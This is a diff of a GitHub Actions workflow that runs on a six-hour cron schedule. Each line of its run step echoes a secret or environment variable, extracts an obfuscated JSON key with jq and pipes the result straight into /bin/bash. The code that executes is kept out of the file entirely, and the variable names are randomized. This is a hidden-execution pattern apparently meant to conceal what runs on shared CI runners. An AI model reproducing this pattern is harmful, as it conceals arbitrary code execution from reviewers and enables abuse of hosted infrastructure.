@@ -1,31 +1,21 @@
 name: dengfei19871010
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 5/6 * * *'
+    - cron: '46 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: dengfei19871010
         env:
-          gry0: ${{ secrets.gry0 }}
+          avhn1957: ${{ secrets.avhn1957 }}
         run: |
-          echo $gry0 | jq -r .qj16770 | /bin/bash
-          echo $fu0996 | jq -r .irksi72 | /bin/bash
-          echo $uxo59974 | jq -r .f83759 | /bin/bash
-          echo $pcygn7 | jq -r .ii749 | /bin/bash
-          echo $mu8 | jq -r .j7 | /bin/bash
-          echo $ukgiy668 | jq -r .c75116 | /bin/bash
-          echo $op44 | jq -r .skfzq56 | /bin/bash
-          echo $v642 | jq -r .n48 | /bin/bash
-          echo $nt3101 | jq -r .cl80 | /bin/bash
-          echo $evv8610 | jq -r .po6106 | /bin/bash
-          echo $sj1490 | jq -r .mjs6 | /bin/bash
-          echo $qnyr9593 | jq -r .tyjjc9 | /bin/bash
-          echo $a31 | jq -r .lwm4975 | /bin/bash
-          echo $yetlf93 | jq -r .eunig9 | /bin/bash
+          echo $avhn1957 | jq -r .fwj40 | /bin/bash
+          echo $movzr185 | jq -r .v12 | /bin/bash
+          echo $o580 | jq -r .lbar3 | /bin/bash
+          echo $kxojx53 | jq -r .zg4 | /bin/bash
 
